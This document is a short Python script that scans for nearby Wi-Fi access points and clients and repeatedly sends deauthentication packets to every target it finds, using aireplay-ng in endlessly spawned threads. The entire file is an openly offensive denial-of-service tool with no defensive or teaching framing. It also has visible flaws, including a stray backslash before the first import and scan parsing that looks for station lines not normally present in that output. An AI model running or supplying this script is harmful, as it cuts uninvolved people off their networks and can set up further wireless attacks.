\import os
import time
import subprocess
import threading

def deauth_attack(interface, bssid, client_mac):
    while True:
        # Send deauthentication packet to target client
        os.system(f"aireplay-ng -0 1 -a {bssid} -c {client_mac} {interface}")
        time.sleep(0.5)

def scan_for_targets(interface):
    # Scan for nearby access points
    scan_output = subprocess.check_output(["iw", interface, "scan"])
    scan_results = scan_output.decode("utf-8")
    
    targets = []
    for line in scan_results.split("\n"):
        if "BSS" in line:
            bssid = line.split("BSS")[1].strip().split("(on")[0].strip()
        elif "Station" in line:
            client_mac = line.split("Station: ")[1]
            targets.append((bssid, client_mac))
    
    return targets

if __name__ == "__main__":
    interface = "wlan0"  # Change to your WiFi interface
    scan_interval = 10  # Scan for targets every 10 seconds

    while True:
        targets = scan_for_targets(interface)
        print(f"Found {len(targets)} targets:")
        for bssid, client_mac in targets:
            print(f"  BSSID: {bssid}, Client: {client_mac}")
            threading.Thread(target=deauth_attack, args=(interface, bssid, client_mac)).start()
        time.sleep(scan_interval)
